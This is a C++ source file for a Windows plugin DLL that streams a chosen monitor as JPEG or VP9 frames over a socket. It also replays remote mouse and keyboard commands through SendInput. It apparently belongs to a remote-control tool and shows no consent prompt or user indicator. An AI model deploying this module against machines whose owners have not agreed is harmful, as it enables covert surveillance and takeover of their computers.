#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;

// libvpx structures and types
typedef void vpx_codec_iface_t;
typedef void vpx_codec_priv_t;

typedef int vpx_codec_err_t;
#define VPX_CODEC_OK 0

typedef uint32_t vpx_codec_flags_t;
typedef int64_t vpx_codec_pts_t;
typedef uint32_t vpx_codec_frame_flags_t;

typedef enum vpx_img_fmt {
    VPX_IMG_FMT_NONE,
    VPX_IMG_FMT_YV12 = 0x100 | 0x200 | 1,
    VPX_IMG_FMT_I420 = 0x100 | 2,
    VPX_IMG_FMT_NV12 = 0x100 | 9
} vpx_img_fmt_t;

struct vpx_rational {
    int num;
    int den;
};

typedef struct vpx_codec_enc_cfg {
    unsigned int g_usage;
    unsigned int g_threads;
    unsigned int g_profile;
    unsigned int g_w;
    unsigned int g_h;
    int g_bit_depth;
    unsigned int g_input_bit_depth;
    struct vpx_rational g_timebase;
    uint32_t g_error_resilient;
    int g_pass;
    unsigned int g_lag_in_frames;
    unsigned int rc_dropframe_thresh;
    unsigned int rc_resize_allowed;
    unsigned int rc_scaled_width;
    unsigned int rc_scaled_height;
    unsigned int rc_resize_up_thresh;
    unsigned int rc_resize_down_thresh;
    int rc_end_usage;
    struct {
        void* buf;
        size_t sz;
    } rc_twopass_stats_in;
    struct {
        void* buf;
        size_t sz;
    } rc_firstpass_mb_stats_in;
    unsigned int rc_target_bitrate;
    unsigned int rc_min_quantizer;
    unsigned int rc_max_quantizer;
    unsigned int rc_undershoot_pct;
    unsigned int rc_overshoot_pct;
    unsigned int rc_buf_sz;
    unsigned int rc_buf_initial_sz;
    unsigned int rc_buf_optimal_sz;
    unsigned int rc_2pass_vbr_bias_pct;
    unsigned int rc_2pass_vbr_minsection_pct;
    unsigned int rc_2pass_vbr_maxsection_pct;
    unsigned int rc_2pass_vbr_corpus_complexity;
    int kf_mode;
    unsigned int kf_min_dist;
    unsigned int kf_max_dist;
    unsigned int reserved[64];
} vpx_codec_enc_cfg_t;

typedef struct vpx_image {
    vpx_img_fmt_t fmt;
    int cs;
    int range;
    unsigned int w;
    unsigned int h;
    unsigned int bit_depth;
    unsigned int d_w;
    unsigned int d_h;
    unsigned int r_w;
    unsigned int r_h;
    unsigned int x_chroma_shift;
    unsigned int y_chroma_shift;
    unsigned char *planes[4];
    int stride[4];
    int bps;
    void *user_priv;
    unsigned char *img_data;
    int img_data_owner;
    int self_allocd;
    void *fb_priv;
} vpx_image_t;

enum vpx_codec_cx_pkt_kind {
    VPX_CODEC_CX_FRAME_PKT,
    VPX_CODEC_STATS_PKT,
    VPX_CODEC_FPMB_STATS_PKT,
    VPX_CODEC_PSNR_PKT,
    VPX_CODEC_CUSTOM_PKT = 256
};

typedef struct vpx_codec_cx_pkt {
    enum vpx_codec_cx_pkt_kind kind;
    union {
        struct {
            void *buf;
            size_t sz;
            vpx_codec_pts_t pts;
            unsigned long duration;
            vpx_codec_frame_flags_t flags;
            int partition_id;
            unsigned int width[12];
            unsigned int height[12];
            uint8_t spatial_layer_encoded[12];
        } frame;
        struct {
            void* buf;
            size_t sz;
        } twopass_stats;
        struct {
            void* buf;
            size_t sz;
        } firstpass_mb_stats;
        struct {
            unsigned int samples[4];
            uint64_t sse[4];
            double psnr[4];
            int spatial_layer_id;
        } psnr;
        struct {
            void* buf;
            size_t sz;
        } raw;
        char pad[128 - sizeof(enum vpx_codec_cx_pkt_kind)];
    } data;
} vpx_codec_cx_pkt_t;

typedef struct vpx_codec_ctx {
    const char *name;
    vpx_codec_iface_t *iface;
    vpx_codec_err_t err;
    const char *err_detail;
    vpx_codec_flags_t init_flags;
    union {
        void *dec;
        vpx_codec_enc_cfg_t *enc;
        void *raw;
    } config;
    vpx_codec_priv_t *priv;
} vpx_codec_ctx_t;

typedef const void *vpx_codec_iter_t;

typedef vpx_codec_iface_t* (*pfn_vpx_codec_vp9_cx_t)(void);
typedef vpx_codec_err_t (*pfn_vpx_codec_enc_config_default_t)(vpx_codec_iface_t *iface, vpx_codec_enc_cfg_t *cfg, unsigned int usage);
typedef vpx_codec_err_t (*pfn_vpx_codec_enc_init_ver_t)(vpx_codec_ctx_t *ctx, vpx_codec_iface_t *iface, const vpx_codec_enc_cfg_t *cfg, vpx_codec_flags_t flags, int ver);
typedef vpx_codec_err_t (*pfn_vpx_codec_encode_t)(vpx_codec_ctx_t *ctx, const vpx_image_t *img, vpx_codec_pts_t pts, unsigned long duration, vpx_codec_frame_flags_t flags, unsigned long deadline);
typedef const vpx_codec_cx_pkt_t* (*pfn_vpx_codec_get_cx_data_t)(vpx_codec_ctx_t *ctx, vpx_codec_iter_t *iter);
typedef vpx_codec_err_t (*pfn_vpx_codec_destroy_t)(vpx_codec_ctx_t *ctx);
typedef vpx_image_t* (*pfn_vpx_img_alloc_t)(vpx_image_t *img, vpx_img_fmt_t fmt, unsigned int d_w, unsigned int d_h, unsigned int align);
typedef void (*pfn_vpx_img_free_t)(vpx_image_t *img);

struct LibVpxFunctions {
    HMODULE hModule = nullptr;
    pfn_vpx_codec_vp9_cx_t vp9_cx = nullptr;
    pfn_vpx_codec_enc_config_default_t enc_config_default = nullptr;
    pfn_vpx_codec_enc_init_ver_t enc_init_ver = nullptr;
    pfn_vpx_codec_encode_t encode = nullptr;
    pfn_vpx_codec_get_cx_data_t get_cx_data = nullptr;
    pfn_vpx_codec_destroy_t destroy = nullptr;
    pfn_vpx_img_alloc_t img_alloc = nullptr;
    pfn_vpx_img_free_t img_free = nullptr;

    bool Load() {
        if (hModule) return true;
        const wchar_t* dlls[] = { L"libvpx.dll", L"vpx.dll", L"libvpx-1.dll" };
        for (const auto* dll : dlls) {
            hModule = LoadLibraryW(dll);
            if (hModule) break;
        }
        if (!hModule) return false;

        vp9_cx = (pfn_vpx_codec_vp9_cx_t)GetProcAddress(hModule, "vpx_codec_vp9_cx");
        enc_config_default = (pfn_vpx_codec_enc_config_default_t)GetProcAddress(hModule, "vpx_codec_enc_config_default");
        enc_init_ver = (pfn_vpx_codec_enc_init_ver_t)GetProcAddress(hModule, "vpx_codec_enc_init_ver");
        encode = (pfn_vpx_codec_encode_t)GetProcAddress(hModule, "vpx_codec_encode");
        get_cx_data = (pfn_vpx_codec_get_cx_data_t)GetProcAddress(hModule, "vpx_codec_get_cx_data");
        destroy = (pfn_vpx_codec_destroy_t)GetProcAddress(hModule, "vpx_codec_destroy");
        img_alloc = (pfn_vpx_img_alloc_t)GetProcAddress(hModule, "vpx_img_alloc");
        img_free = (pfn_vpx_img_free_t)GetProcAddress(hModule, "vpx_img_free");

        if (!vp9_cx || !enc_config_default || !enc_init_ver || !encode || !get_cx_data || !destroy || !img_alloc || !img_free) {
            FreeLibrary(hModule);
            hModule = nullptr;
            return false;
        }
        return true;
    }

    void Unload() {
        if (hModule) {
            FreeLibrary(hModule);
            hModule = nullptr;
        }
    }
};

struct MonitorData {
    RECT rect{};
    string deviceName;
    string displayName;
    bool primary = false;
};

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct MonitorFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_MONITOR_FRAME = 0x03;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_captureSocket = INVALID_SOCKET;
static int g_monitorIndex = 0;
static int g_scalePercent = 50;
static int g_targetFps = 20;
static int g_format = 1; // 1 = JPEG, 4 = VP9
static RECT g_captureRect{};
static bool g_hasCaptureRect = false;

static mutex g_encoderMutex;
static LibVpxFunctions g_vpx;
static vpx_codec_ctx_t g_vpxEncoder{};
static bool g_vpxEncoderInitialized = false;
static int g_lastWidth = 0;
static int g_lastHeight = 0;
static int g_lastFormat = 1;
static int64_t g_vpxPts = 0;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

static bool safe_send_raw(SOCKET sock, const string& data) {
    const char* ptr = data.c_str();
    int remaining = (int)data.size();

    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0)
            return false;
        ptr += sent;
        remaining -= sent;
    }

    return true;
}

static bool safe_send_json(SOCKET sock, const json& data) {
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump(-1, ' ', false, json::error_handler_t::replace);
    return safe_send_raw(sock, serialized + "\r\n");
}

static bool safe_send_monitor_frame(SOCKET sock,
                                    int monitor,
                                    int scale,
                                    int fps,
                                    int width,
                                    int height,
                                    int format,
                                    const vector<unsigned char>& frameBytes) {
    if (frameBytes.empty())
        return false;

    MonitorFrameHeader frameHeader{};
    frameHeader.monitor = (uint32_t)max(0, monitor);
    frameHeader.scale = (uint32_t)max(0, scale);
    frameHeader.fps = (uint32_t)max(0, fps);
    frameHeader.width = (uint32_t)max(0, width);
    frameHeader.height = (uint32_t)max(0, height);
    frameHeader.format = (uint32_t)format;
    frameHeader.dataSize = (uint32_t)frameBytes.size();

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type = PACKET_TYPE_MONITOR_FRAME;
    packetHeader.size = (uint32_t)(sizeof(MonitorFrameHeader) + frameBytes.size());

    string packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(&packet[0], &packetHeader, sizeof(PacketHeader));
    memcpy(&packet[sizeof(PacketHeader)], &frameHeader, sizeof(MonitorFrameHeader));
    memcpy(&packet[sizeof(PacketHeader) + sizeof(MonitorFrameHeader)], frameBytes.data(), frameBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    return safe_send_raw(sock, packet);
}

static void send_monitor_error(SOCKET sock, const string& message) {
    json response;
    response["action"] = "monitorerror";
    response["error"] = message;
    safe_send_json(sock, response);
}

static string wide_to_utf8(const wchar_t* value) {
    if (!value || value[0] == L'\0')
        return "";

    int size = WideCharToMultiByte(CP_UTF8, 0, value, -1, NULL, 0, NULL, NULL);
    if (size <= 1)
        return "";

    string result(size - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value, -1, &result[0], size, NULL, NULL);
    return result;
}

static string get_display_name(const char* deviceName) {
    if (!deviceName || deviceName[0] == '\0')
        return "";

    DISPLAY_DEVICEA displayDevice{};
    displayDevice.cb = sizeof(displayDevice);
    if (EnumDisplayDevicesA(deviceName, 0, &displayDevice, 0) && displayDevice.DeviceString[0] != '\0')
        return string(displayDevice.DeviceString);

    return "";
}

static BOOL CALLBACK enum_monitor_proc(HMONITOR monitor, HDC, LPRECT, LPARAM userData) {
    vector<MonitorData>* monitors = reinterpret_cast<vector<MonitorData>*>(userData);

    MONITORINFOEXA info{};
    info.cbSize = sizeof(info);
    if (!GetMonitorInfoA(monitor, &info))
        return TRUE;

    MonitorData item;
    item.rect = info.rcMonitor;
    item.deviceName = info.szDevice;
    item.displayName = get_display_name(info.szDevice);
    item.primary = (info.dwFlags & MONITORINFOF_PRIMARY) != 0;

    if (item.displayName.empty())
        item.displayName = item.deviceName.empty() ? "Monitor" : item.deviceName;

    monitors->push_back(item);
    return TRUE;
}

static vector<MonitorData> enumerate_monitors() {
    vector<MonitorData> monitors;
    EnumDisplayMonitors(NULL, NULL, enum_monitor_proc, reinterpret_cast<LPARAM>(&monitors));

    if (monitors.empty()) {
        MonitorData fallback;
        fallback.rect.left = GetSystemMetrics(SM_XVIRTUALSCREEN);
        fallback.rect.top = GetSystemMetrics(SM_YVIRTUALSCREEN);
        fallback.rect.right = fallback.rect.left + GetSystemMetrics(SM_CXVIRTUALSCREEN);
        fallback.rect.bottom = fallback.rect.top + GetSystemMetrics(SM_CYVIRTUALSCREEN);
        fallback.displayName = "Virtual Screen";
        fallback.primary = true;
        monitors.push_back(fallback);
    }

    return monitors;
}

static void send_monitor_list(SOCKET sock) {
    vector<MonitorData> monitors = enumerate_monitors();
    json response;
    response["action"] = "monitorlistresponse";
    response["monitors"] = json::array();

    for (size_t i = 0; i < monitors.size(); ++i) {
        const MonitorData& monitor = monitors[i];
        int width = monitor.rect.right - monitor.rect.left;
        int height = monitor.rect.bottom - monitor.rect.top;

        string name = monitor.displayName.empty() ? ("Monitor " + to_string(i + 1)) : monitor.displayName;
        if (monitor.primary)
            name += " (Primary)";

        response["monitors"].push_back({
            {"index", (int)i},
            {"name", name},
            {"device", monitor.deviceName},
            {"left", monitor.rect.left},
            {"top", monitor.rect.top},
            {"width", width},
            {"height", height},
            {"primary", monitor.primary}
        });
    }

    safe_send_json(sock, response);
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0)
        return true;

    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0;
    UINT size = 0;

    GetImageEncodersSize(&count, &size);
    if (size == 0)
        return -1;

    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok)
        return -1;

    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }

    return -1;
}

static DWORD now_ms() {
    return GetTickCount();
}

static int clamp_int(int value, int minValue, int maxValue) {
    return max(minValue, min(value, maxValue));
}

static int automatic_fps_for_scale(int scalePercent) {
    if (scalePercent >= 90) return 20;
    if (scalePercent >= 70) return 22;
    if (scalePercent >= 50) return 24;
    return 25;
}

static ULONG automatic_jpeg_quality(int width, int height, int scalePercent) {
    int pixels = max(1, width * height);

    if (scalePercent >= 90 || pixels >= 2500000) return 30;
    if (scalePercent >= 70 || pixels >= 1600000) return 36;
    if (scalePercent >= 50 || pixels >= 900000) return 44;
    return 52;
}

static bool bitmap_to_jpeg(HBITMAP bitmapHandle, ULONG quality, vector<unsigned char>& bytes, string& error) {
    bytes.clear();

    if (!ensure_gdiplus()) {
        error = "GDI+ could not be started";
        return false;
    }

    CLSID jpegClsid;
    if (get_encoder_clsid(L"image/jpeg", &jpegClsid) < 0) {
        error = "JPEG encoder not found";
        return false;
    }

    Bitmap bitmap(bitmapHandle, NULL);
    if (bitmap.GetLastStatus() != Ok) {
        error = "Bitmap conversion failed";
        return false;
    }

    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK || !stream) {
        error = "Memory stream could not be created";
        return false;
    }

    EncoderParameters params{};
    params.Count = 1;
    params.Parameter[0].Guid = EncoderQuality;
    params.Parameter[0].Type = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues = 1;
    params.Parameter[0].Value = &quality;

    Status status = bitmap.Save(stream, &jpegClsid, &params);
    if (status != Ok) {
        stream->Release();
        error = "JPEG encoding failed";
        return false;
    }

    STATSTG stat{};
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK || stat.cbSize.QuadPart <= 0) {
        stream->Release();
        error = "Encoded image size could not be read";
        return false;
    }

    if (stat.cbSize.QuadPart > 64LL * 1024LL * 1024LL) {
        stream->Release();
        error = "Encoded image is too large";
        return false;
    }

    LARGE_INTEGER seekPos{};
    stream->Seek(seekPos, STREAM_SEEK_SET, NULL);

    bytes.resize((size_t)stat.cbSize.QuadPart);
    ULONG readBytes = 0;
    HRESULT readResult = stream->Read(bytes.data(), (ULONG)bytes.size(), &readBytes);
    stream->Release();

    if (readResult != S_OK || readBytes != bytes.size()) {
        error = "Encoded image could not be read";
        bytes.clear();
        return false;
    }

    return true;
}

static void BGRX_to_I420(const uint32_t* bgrx, int width, int height,
                         uint8_t* dst_y, uint8_t* dst_u, uint8_t* dst_v,
                         int stride_y, int stride_u, int stride_v) {
    for (int y = 0; y < height; ++y) {
        for (int x = 0; x < width; ++x) {
            uint32_t pixel = bgrx[y * width + x];
            uint8_t b = pixel & 0xFF;
            uint8_t g = (pixel >> 8) & 0xFF;
            uint8_t r = (pixel >> 16) & 0xFF;

            int Y = ((66 * r + 129 * g + 25 * b + 128) >> 8) + 16;
            dst_y[y * stride_y + x] = static_cast<uint8_t>(clamp_int(Y, 0, 255));

            if ((y % 2 == 0) && (x % 2 == 0)) {
                int U = ((-38 * r - 74 * g + 112 * b + 128) >> 8) + 128;
                int V = ((112 * r - 94 * g - 18 * b + 128) >> 8) + 128;
                dst_u[(y / 2) * stride_u + (x / 2)] = static_cast<uint8_t>(clamp_int(U, 0, 255));
                dst_v[(y / 2) * stride_v + (x / 2)] = static_cast<uint8_t>(clamp_int(V, 0, 255));
            }
        }
    }
}

static bool capture_monitor_frame(const RECT& rect,
                                  int scalePercent,
                                  int format,
                                  vector<unsigned char>& frameBytes,
                                  int& outputWidth,
                                  int& outputHeight,
                                  string& error) {
    scalePercent = max(10, min(scalePercent, 100));

    int sourceWidth = rect.right - rect.left;
    int sourceHeight = rect.bottom - rect.top;
    if (sourceWidth <= 0 || sourceHeight <= 0) {
        error = "Invalid monitor dimensions";
        return false;
    }

    outputWidth = max(1, (sourceWidth * scalePercent) / 100);
    outputHeight = max(1, (sourceHeight * scalePercent) / 100);

    // Make dimensions even for YUV420 and video encoders
    if (outputWidth % 2 != 0) outputWidth++;
    if (outputHeight % 2 != 0) outputHeight++;

    if (format == 4) {
        lock_guard<mutex> enc_lock(g_encoderMutex);

        if (!g_vpxEncoderInitialized || g_lastWidth != outputWidth || g_lastHeight != outputHeight || g_lastFormat != 4) {
            if (g_vpxEncoderInitialized) {
                g_vpx.destroy(&g_vpxEncoder);
                g_vpxEncoderInitialized = false;
            }

            if (!g_vpx.Load()) {
                error = "vpx DLL could not be loaded";
                return false;
            }

            vpx_codec_enc_cfg_t cfg{};
            if (g_vpx.enc_config_default(g_vpx.vp9_cx(), &cfg, 0) != VPX_CODEC_OK) {
                error = "Failed to get default vpx config";
                return false;
            }

            cfg.g_w = outputWidth;
            cfg.g_h = outputHeight;
            cfg.g_timebase.num = 1;
            cfg.g_timebase.den = 1000;
            cfg.g_threads = 4;
            cfg.g_lag_in_frames = 0;
            cfg.rc_end_usage = 1; // VPX_CBR
            cfg.rc_target_bitrate = 1500;
            cfg.kf_mode = 1; // VPX_KF_AUTO
            cfg.kf_max_dist = 60;

            bool init_ok = false;
            for (int abi = 1; abi <= 20; ++abi) {
                if (g_vpx.enc_init_ver(&g_vpxEncoder, g_vpx.vp9_cx(), &cfg, 0, abi) == VPX_CODEC_OK) {
                    init_ok = true;
                    break;
                }
            }

            if (!init_ok) {
                error = "Failed to initialize VP9 encoder context";
                return false;
            }

            g_vpxEncoderInitialized = true;
            g_lastWidth = outputWidth;
            g_lastHeight = outputHeight;
            g_lastFormat = 4;
            g_vpxPts = 0;
        }

        HDC screenDC = GetDC(NULL);
        if (!screenDC) {
            error = "Failed to get screen DC";
            return false;
        }

        HDC memoryDC = CreateCompatibleDC(screenDC);
        if (!memoryDC) {
            ReleaseDC(NULL, screenDC);
            error = "Failed to create memory DC";
            return false;
        }

        HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
        if (!bitmap) {
            DeleteDC(memoryDC);
            ReleaseDC(NULL, screenDC);
            error = "Failed to create bitmap";
            return false;
        }

        HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
        SetStretchBltMode(memoryDC, COLORONCOLOR);

        BOOL copied = StretchBlt(
            memoryDC, 0, 0, outputWidth, outputHeight,
            screenDC, rect.left, rect.top, sourceWidth, sourceHeight,
            SRCCOPY | CAPTUREBLT
        );

        SelectObject(memoryDC, oldObject);

        if (!copied) {
            DeleteObject(bitmap);
            DeleteDC(memoryDC);
            ReleaseDC(NULL, screenDC);
            error = "StretchBlt failed";
            return false;
        }

        BITMAPINFO bmi{};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = outputWidth;
        bmi.bmiHeader.biHeight = -outputHeight; // Top-down
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        vector<uint32_t> bgrxPixels(outputWidth * outputHeight);
        GetDIBits(memoryDC, bitmap, 0, outputHeight, bgrxPixels.data(), &bmi, DIB_RGB_COLORS);

        DeleteObject(bitmap);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);

        vpx_image_t img{};
        if (!g_vpx.img_alloc(&img, VPX_IMG_FMT_I420, outputWidth, outputHeight, 32)) {
            error = "vpx image allocation failed";
            return false;
        }

        BGRX_to_I420(bgrxPixels.data(), outputWidth, outputHeight,
                     img.planes[0], img.planes[1], img.planes[2],
                     img.stride[0], img.stride[1], img.stride[2]);

        vpx_codec_err_t enc_res = g_vpx.encode(&g_vpxEncoder, &img, g_vpxPts++, 33, 0, 1); // VPX_DL_REALTIME = 1
        g_vpx.img_free(&img);

        if (enc_res != VPX_CODEC_OK) {
            error = "vpx encode failed";
            return false;
        }

        vpx_codec_iter_t iter = nullptr;
        const vpx_codec_cx_pkt_t* pkt = nullptr;
        while ((pkt = g_vpx.get_cx_data(&g_vpxEncoder, &iter)) != nullptr) {
            if (pkt->kind == VPX_CODEC_CX_FRAME_PKT) {
                size_t old_size = frameBytes.size();
                frameBytes.resize(old_size + pkt->data.frame.sz);
                memcpy(&frameBytes[old_size], pkt->data.frame.buf, pkt->data.frame.sz);
            }
        }

        return !frameBytes.empty();
    } else {
        // JPEG mode
        ULONG jpegQuality = automatic_jpeg_quality(outputWidth, outputHeight, scalePercent);

        HDC screenDC = GetDC(NULL);
        if (!screenDC) {
            error = "Screen device context could not be opened";
            return false;
        }

        HDC memoryDC = CreateCompatibleDC(screenDC);
        if (!memoryDC) {
            ReleaseDC(NULL, screenDC);
            error = "Memory device context could not be created";
            return false;
        }

        HBITMAP bitmap = CreateCompatibleBitmap(screenDC, outputWidth, outputHeight);
        if (!bitmap) {
            DeleteDC(memoryDC);
            ReleaseDC(NULL, screenDC);
            error = "Capture bitmap could not be created";
            return false;
        }

        HGDIOBJ oldObject = SelectObject(memoryDC, bitmap);
        SetStretchBltMode(memoryDC, COLORONCOLOR);

        BOOL copied = StretchBlt(
            memoryDC,
            0,
            0,
            outputWidth,
            outputHeight,
            screenDC,
            rect.left,
            rect.top,
            sourceWidth,
            sourceHeight,
            SRCCOPY | CAPTUREBLT
        );

        SelectObject(memoryDC, oldObject);
        DeleteDC(memoryDC);
        ReleaseDC(NULL, screenDC);

        if (!copied) {
            DeleteObject(bitmap);
            error = "Screen capture failed";
            return false;
        }

        bool encoded = bitmap_to_jpeg(bitmap, jpegQuality, frameBytes, error);
        DeleteObject(bitmap);
        return encoded;
    }
}

static void capture_loop() {
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);

    while (g_captureRunning.load()) {
        DWORD frameStart = now_ms();
        SOCKET sock = INVALID_SOCKET;
        int monitor = 0;
        int scale = 50;
        int targetFps = 20;
        int format = 1;
        RECT captureRect{};
        bool hasCaptureRect = false;

        {
            lock_guard<mutex> lock(g_captureMutex);
            sock = g_captureSocket;
            monitor = g_monitorIndex;
            scale = g_scalePercent;
            targetFps = g_targetFps;
            format = g_format;
            captureRect = g_captureRect;
            hasCaptureRect = g_hasCaptureRect;
        }

        if (!hasCaptureRect) {
            send_monitor_error(sock, "Capture monitor is not ready");
            g_captureRunning.store(false);
            break;
        }

        vector<unsigned char> frameBytes;
        int width = 0;
        int height = 0;
        string error;

        if (capture_monitor_frame(captureRect, scale, format, frameBytes, width, height, error)) {
            if (!safe_send_monitor_frame(sock, monitor, scale, targetFps, width, height, format, frameBytes)) {
                g_captureRunning.store(false);
                break;
            }
        } else {
            send_monitor_error(sock, error.empty() ? "Capture failed" : error);
            g_captureRunning.store(false);
            break;
        }

        DWORD elapsed = now_ms() - frameStart;
        DWORD interval = (DWORD)max(1, 1000 / clamp_int(targetFps, 20, 30));
        DWORD waitMs = (elapsed >= interval) ? 1 : (interval - elapsed);

        while (waitMs > 0 && g_captureRunning.load()) {
            DWORD chunk = min<DWORD>(waitMs, 20);
            Sleep(chunk);
            waitMs -= chunk;
        }
    }
}

static void stop_capture_thread() {
    g_captureRunning.store(false);

    if (g_captureThread.joinable()) {
        if (g_captureThread.get_id() == this_thread::get_id())
            g_captureThread.detach();
        else
            g_captureThread.join();
    }

    lock_guard<mutex> lock(g_captureMutex);
    g_hasCaptureRect = false;

    {
        lock_guard<mutex> enc_lock(g_encoderMutex);
        if (g_vpxEncoderInitialized) {
            g_vpx.destroy(&g_vpxEncoder);
            g_vpxEncoderInitialized = false;
        }
        g_vpx.Unload();
    }
}

static void start_capture(SOCKET sock, int monitorIndex, int scalePercent, int requestedFps, int format) {
    scalePercent = clamp_int(scalePercent, 10, 100);
    int targetFps = requestedFps > 0
        ? clamp_int(requestedFps, 20, 30)
        : automatic_fps_for_scale(scalePercent);

    vector<MonitorData> monitors = enumerate_monitors();
    if (monitors.empty()) {
        send_monitor_error(sock, "No monitors found");
        return;
    }

    int safeMonitorIndex = clamp_int(monitorIndex, 0, (int)monitors.size() - 1);

    {
        lock_guard<mutex> lock(g_captureMutex);
        g_captureSocket = sock;
        g_monitorIndex = safeMonitorIndex;
        g_scalePercent = scalePercent;
        g_targetFps = targetFps;
        g_format = format;
        g_captureRect = monitors[(size_t)safeMonitorIndex].rect;
        g_hasCaptureRect = true;
    }

    if (!g_captureRunning.exchange(true)) {
        if (g_captureThread.joinable())
            g_captureThread.join();
        g_captureThread = thread(capture_loop);
    }

    json response;
    response["action"] = "monitorstatus";
    response["status"] = "started";
    response["monitor"] = safeMonitorIndex;
    response["scale"] = scalePercent;
    response["fps"] = targetFps;
    response["format"] = format;
    safe_send_json(sock, response);
}

static void simulate_mouse(const string& event, int button, int x, int y) {
    RECT rect{};
    {
        lock_guard<mutex> lock(g_captureMutex);
        if (!g_hasCaptureRect) return;
        rect = g_captureRect;
    }

    int screen_x = rect.left + MulDiv(x, rect.right - rect.left, 65535);
    int screen_y = rect.top + MulDiv(y, rect.bottom - rect.top, 65535);

    int v_left = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int v_top = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int v_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int v_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (v_width <= 0 || v_height <= 0) return;

    double fx = (double)(screen_x - v_left) * (65535.0 / (double)(v_width - 1));
    double fy = (double)(screen_y - v_top) * (65535.0 / (double)(v_height - 1));

    INPUT input = {0};
    input.type = INPUT_MOUSE;
    input.mi.dx = (LONG)fx;
    input.mi.dy = (LONG)fy;
    input.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_VIRTUALDESK;

    if (event == "move") {
        input.mi.dwFlags |= MOUSEEVENTF_MOVE;
    } else if (event == "down") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTDOWN;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTDOWN;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEDOWN;
    } else if (event == "up") {
        if (button == 0) input.mi.dwFlags |= MOUSEEVENTF_LEFTUP;
        else if (button == 1) input.mi.dwFlags |= MOUSEEVENTF_RIGHTUP;
        else if (button == 2) input.mi.dwFlags |= MOUSEEVENTF_MIDDLEUP;
    }

    SendInput(1, &input, sizeof(INPUT));
}

static void simulate_key(const string& event, int vk) {
    INPUT input = {0};
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = (WORD)vk;
    if (event == "up") {
        input.ki.dwFlags = KEYEVENTF_KEYUP;
    }
    SendInput(1, &input, sizeof(INPUT));
}

extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
    send_monitor_list(sock);
}

extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* commandJson) {
    try {
        json command = json::parse(commandJson ? commandJson : "{}");
        string action = command.value("action", "");

        if (action == "monitorlist") {
            send_monitor_list(sock);
            return;
        }

        if (action == "monitorstart") {
            int monitor = command.value("monitor", 0);
            int scale = command.value("scale", 50);
            int fps = command.value("fps", 0);
            int format = command.value("format", 1);
            start_capture(sock, monitor, scale, fps, format);
            return;
        }

        if (action == "monitorstop") {
            stop_capture_thread();

            json response;
            response["action"] = "monitorstatus";
            response["status"] = "stopped";
            safe_send_json(sock, response);
            return;
        }

        if (action == "mouseevent") {
            string event = command.value("event", "");
            int button = command.value("button", 0);
            int x = command.value("x", 0);
            int y = command.value("y", 0);
            simulate_mouse(event, button, x, y);
            return;
        }

        if (action == "keyevent") {
            string event = command.value("event", "");
            int vk = command.value("key", 0);
            simulate_key(event, vk);
            return;
        }

        send_monitor_error(sock, "Unknown monitoring action");
    } catch (const std::exception& e) {
        send_monitor_error(sock, string("Command parse failed: ") + e.what());
    } catch (...) {
        send_monitor_error(sock, "Command parse failed");
    }
}

